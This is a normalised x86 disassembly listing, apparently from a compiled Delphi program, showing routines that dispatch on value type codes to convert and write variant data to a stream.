pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
push ebp
call sub_41f274
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
sub_41f34c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41f3f8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
sete bl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f3ff
lea eax [ ebp - 0x8 ]
call sub_4057bc
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4153a4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebp - 0x4 ]
sete bl
test bl bl
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_4057bc
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d140
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_41f234
pop ecx
mov ebx eax
sub_41f418
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f4d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4153a4
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4057bc
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d140
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f4dc
lea eax [ ebp - 0x10 ]
call sub_4057bc
lea eax [ ebp - 0xc ]
call sub_4057bc
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4153a4
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
call sub_41f34c
pop ecx
test al al
jne r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
xor ebx ebx
sub_41f4f4
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4152c8
xor ebx ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
cmp ebx [ ebp - 0x8 ]
je r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4152c8
mov ebx [ ebp - 0x10 ]
mov al 0x1
mov esi [ ebp - 0x8 ]
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x110 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov eax [ eax ]
mov edx esi
call sub_403410
cmp [ ebp - 0x110 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f56c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
xor eax eax
push ebp
push sub_41f5f3
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_415248
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x9 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
call sub_413ee0
mov ebx eax
lea ecx [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415248
lea edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
call sub_413f54
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5fa
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4049cc
retn
sub_41f604
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x10 ]
call sub_41f068
mov [ ebp - 0x9 ] al
mov bl 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
jmp [ eax * 4 + jump_table_41f6c6 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4149f4
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
push ebp
call sub_41f098
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f0f0
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f1a4
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f2cc
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f4f4
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f56c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f14c
pop ecx
mov ebx eax
jmp r-xdata
push ebp
call sub_41f418
pop ecx
mov ebx eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4149f4
test [ eax + 0x24 ] 0x4
je r-xdata
sub_41f76c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41f7b4
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_4041b4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42057c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f7bb
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_41f7c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi eax
xor eax eax
push ebp
push sub_41f846
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_41476c
mov eax [ eax + 0x1 ]
mov edi [ eax ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xb
call sub_4207c8
xor ebx ebx
jae r-xdata
bt esi eax
inc ebx
cmp ebx 0x20
jne r-xdata
lea ecx [ ebp - 0x4 ]
mov edx ebx
mov eax edi
call sub_414778
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4205e0
mov eax ebx
cmp eax 0x1f
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
xor edx edx
call sub_4205e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f84d
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_41f854
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
xor edx edx
push ebp
push sub_41f8b4
push [ fs : edx ]
mov [ fs : edx ] esp
call sub_417d9c
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_41ee80
lea edx [ ebp - 0x4 ]
mov eax esi
call ebx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41edbc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f8bb
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
sub_41f8c0
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_41f956
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_403fe8
xor eax eax
push ebp
push sub_41f939
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
call sub_403f50
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
call sub_41e6c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f940
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0x4 ]
call sub_403fa4
retn
sub_41f964
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_41fa18
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4149f4
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax ]
dec al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov edx ebx
call sub_41f854
pop ecx
jmp r-xdata
dec al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fa1f
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41e670
jmp r-xdata
dec al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx ebx
call sub_414778
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41edbc
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_41f7c0
pop ecx
jmp r-xdata
jmp r-xdata
sub_41fa24
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414f24
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
mov ax [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41ed2c
mov esp ebp
pop ebp
retn
sub_41fa64
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415340
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41eef4
pop ecx
pop ecx
pop ebp
retn
sub_41faa0
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41faf5
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414d68
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_420714
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fafc
lea eax [ ebp - 0x4 ]
call sub_404630
retn
sub_41fb18
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41fc07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fa4
jmp r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403fa4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fc0e
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_403f50
mov eax esi
mov ecx r-xdata
mov edx [ ebx + 0x8 ]
call sub_40425c
jmp r-xdata
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x1c ]
mov eax edi
call sub_41fb00
test al al
je r-xdata
mov eax [ ebx + 0x4 ]
push [ eax + 0x8 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4042d0
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call sub_41fb18
pop ecx
push [ ebp - 0x4 ]
push r-xdata
push [ ebx + 0x8 ]
mov eax esi
mov edx 0x3
call sub_4042d0
jmp r-xdata
sub_41fc40
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_41fe34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4149f4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_4207c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41fe3b
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f74
retn
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x2c ]
call sub_403fe8
xor eax eax
push ebp
push sub_41fdb5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push [ eax + 0x2c ]
lea eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edx 0x1a
call sub_4041b4
push [ ebp - 0x14 ]
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx 0x3
call sub_4042d0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x24 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_41efa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add eax 0x2c
mov edx [ ebp - 0xc ]
call sub_403fa4
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_4149f4
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_41fb18
pop ecx
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
call sub_41edbc
jmp r-xdata
sub_41fe4c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
xor eax eax
push ebp
push sub_41ff09
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4153a4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x8 ]
call sub_4057bc
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_40d140
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_4207c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ff10
lea eax [ ebp - 0xc ]
call sub_403f50
lea eax [ ebp - 0x8 ]
call sub_4057bc
lea eax [ ebp - 0x4 ]
call sub_4057bc
retn
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xc ]
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_41fb18
pop ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_41edbc
sub_41ff28
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41ffc3
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4152c8
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
mov ebx [ ebp - 0x8 ]
test ebx ebx
jne r-xdata
lea ecx [ ebp - 0x10c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax ]
mov edx ebx
call sub_403410
lea edx [ ebp - 0x10c ]
lea eax [ ebp - 0xc ]
call sub_4041b4
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_41edbc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xd
call sub_4207c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ffca
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_41ffd0
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_420029
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_415248
mov eax [ ebp + 0x8 ]
push eax
call sub_41f76c
pop ecx
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_420180
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420030
lea eax [ ebp - 0x10 ]
call sub_40ee2c
retn
sub_420034
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
push sub_4207dc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_41f604
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp [ eax ] 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_41f068
mov [ ebp - 0x11 ] al
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4149f4
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
jmp [ eax * 4 + jump_table_4200f2 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4149f4
test [ eax + 0x24 ] 0x4
je r-xdata
push ebp
call sub_41f964
pop ecx
jmp r-xdata
push ebp
call sub_41fa24
pop ecx
jmp r-xdata
push ebp
call sub_41faa0
pop ecx
jmp r-xdata
push ebp
call sub_41fc40
pop ecx
jmp r-xdata
push ebp
call sub_41ff28
pop ecx
jmp r-xdata
push ebp
call sub_41ffd0
pop ecx
jmp r-xdata
push ebp
call sub_41fa64
pop ecx
jmp r-xdata
push ebp
call sub_41fe4c
pop ecx
sub_420180
push ebp
mov ebp esp
add esp 0xfffffec4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x1c ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42055c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_414034
test al al
je r-xdata
mov eax ebx
call sub_413ecc
and ax 0xfff
movzx eax ax
cmp eax 0x7
jg r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
cmp eax 0x10
jge r-xdata
je r-xdata
add eax 0xfffffff0
sub eax 0x3
jb r-xdata
sub eax 0x8
je r-xdata
mov eax ebx
call sub_411120
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ed98
jmp r-xdata
cmp eax 0x6
ja r-xdata
mov eax ebx
call sub_40f7d0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_41ee80
jmp r-xdata
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x2c ]
mov edx ebx
call sub_412858
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_420714
jmp r-xdata
sub eax 0x3
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420563
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_403f74
lea eax [ ebp - 0x34 ]
call sub_4057bc
lea eax [ ebp - 0x30 ]
call sub_403f50
lea eax [ ebp - 0x2c ]
call sub_404630
lea eax [ ebp - 0x1c ]
call sub_4057bc
retn
xor eax eax
push ebp
push sub_420500
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov ax [ ebx ]
call sub_41432c
test al al
je r-xdata
jmp [ eax * 4 + jump_table_4201fe ]
mov eax ebx
call sub_410294
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] edx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41eef4
jmp r-xdata
sub eax 0xeb
je r-xdata
mov eax ebx
call sub_410bd8
test al al
je r-xdata
jmp r-xdata
lea eax [ ebp - 0x38 ]
mov edx ebx
call sub_412130
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_4206c0
jmp r-xdata
lea eax [ ebp - 0x1c ]
call sub_4057bc
push eax
lea eax [ ebp - 0x34 ]
mov edx ebx
call sub_412e30
mov eax [ ebp - 0x34 ]
mov edx r-xdata
pop ecx
call sub_40d140
test al al
jne r-xdata
mov dl 0xd
mov eax [ ebp - 0x4 ]
call sub_4207c8
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4207c8
jmp r-xdata
mov eax ebx
call sub_411120
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ed50
jmp r-xdata
mov eax ebx
call sub_411120
add esp 0xfffffff4
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ed2c
jmp r-xdata
mov eax ebx
call sub_411a7c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call sub_41ed74
jmp r-xdata
lea eax [ ebp - 0x30 ]
mov edx ebx
call sub_412130
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_4206c0
jmp r-xdata
jmp r-xdata
mov dl 0x8
mov eax [ ebp - 0x4 ]
call sub_4207c8
jmp r-xdata
mov dl 0x9
mov eax [ ebp - 0x4 ]
call sub_4207c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4204ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403124
mov [ ebp - 0x10 ] eax
push 0x400
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_41b53c
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_420495
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x13c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call sub_4030a4
lea edx [ ebp - 0x13c ]
lea eax [ ebp - 0x3c ]
call sub_4041b4
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x14 ]
call sub_4206c0
lea edx [ ebp - 0x18 ]
mov ecx 0x4
mov eax [ ebp - 0x14 ]
call sub_41e570
mov eax [ ebp - 0x10 ]
mov edx [ eax + 0x4 ]
